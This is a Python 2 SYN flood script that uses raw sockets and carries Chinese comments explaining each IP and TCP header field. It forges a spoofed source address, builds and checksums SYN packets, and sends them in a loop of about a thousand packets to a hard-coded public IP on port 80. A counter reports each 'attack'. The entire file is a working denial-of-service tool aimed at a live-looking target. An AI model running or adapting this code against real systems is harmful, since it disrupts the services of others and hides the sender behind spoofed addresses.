#encoding:utf-8
'''
    Syn flood program in python using raw sockets (Linux)
    Silver Moon (m00n.silv3r@gmail.com)
'''
 
# some imports
import socket, sys
from struct import *
# checksum functions needed for calculation checksum



def checksum(msg):#计算校验和的子函数
    s = 0# 1、  把校验和字段置为0；

#2、  对ip头部中的每16bit进行二进制求和；
#3、  如果和的高16bit不为0，则将和的高16bit和低16bit反复相加，直到和的高16bit为0，从而获得一个16bit的值；

    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
    s = (s>>16) + (s & 0xffff);
    s = ~s & 0xffff# 4、  将该16bit的值取反，存入校验和字段。
    return s
 

###############################################################################
#create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1]
    sys.exit()
# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)







# 现在开始构建包
packet = '';
#source_ip = '192.168.1.101'
source_ip = '192.168.186.129'#随机产生一个伪造的IP
dest_ip = '111.161.66.166' # 目标IP
 

 #############################################################
# IP报头域
ihl = 5#4位首部长度
version = 4#4位IP版本号
tos = 0#4位服务类型TOS
tot_len = 20 + 20  # 16位总长度（字节）
id = 54321  #该包ID
frag_off = 0
ttl = 255#生存时间
protocol = socket.IPPROTO_TCP
check = 10  # IP首部校验和
saddr =socket.inet_aton ( source_ip )  #源IP地址欺骗
daddr = socket.inet_aton ( dest_ip )#目的IP地址
ihl_version = (version << 4) + ihl#4位首部长度,4位IP版本号
# the ! in the pack format string means network order
ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 #用于将Python的值根据格式符，转换为字符串
 #############################################################




# tcp header fields

source = 8000   #随机产生一个端口号
dest = 80   # 目的端口
seq = 0    #序列号
ack_seq = 0  #确认号
doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
#tcp flags
fin = 0#
syn = 1#
rst = 0#
psh = 0#
ack = 0#
urg = 0#
window = socket.htons (5840)    #   maximum allowed window size
check = 0#
urg_ptr = 0#
offset_res = (doff << 4) + 0#
tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)#
# the ! in the pack format string means network order
tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
 #############################################################



# 伪报头域
source_address = socket.inet_aton( source_ip )#将一个字符串IP地址转换为一个32位的网络序列IP地址
dest_address = socket.inet_aton(dest_ip)#
placeholder = 0  #占位符
protocol = socket.IPPROTO_TCP  #使用tcp协议
tcp_length = len(tcp_header)#
psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
psh = psh + tcp_header;#
tcp_checksum = checksum(psh)#
# 使TCP报头再次填写正确的校验和
tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
  ############################################################# #############################################################
# 最后一个包---SYN包没有任何数据
packet = ip_header + tcp_header
 


#Send the packet finally - the port specified has no effect
i=0 
while 1:
    s.sendto(packet, (dest_ip , 0)) 
    print 'send:  ',packet
    print 'recvive:  ', s.recv(1024)
    if i>1000:
        break
    i=i+1
    print '已攻击  '   +  str(i)  +'  次'    
    #print 'send:   '+packet